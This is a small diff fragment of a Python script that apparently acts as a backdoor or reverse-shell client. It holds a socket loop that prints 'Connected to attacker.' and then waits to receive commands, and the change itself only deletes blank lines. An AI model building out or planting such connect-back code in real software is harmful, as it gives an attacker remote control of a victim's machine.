@@ -15,8 +15,6 @@ while True:
         s.settimeout(None)
         print("Connected to attacker.")
 
-        
-        
         while True:
             try:
                 validation = s.recv(1024).decode().strip()
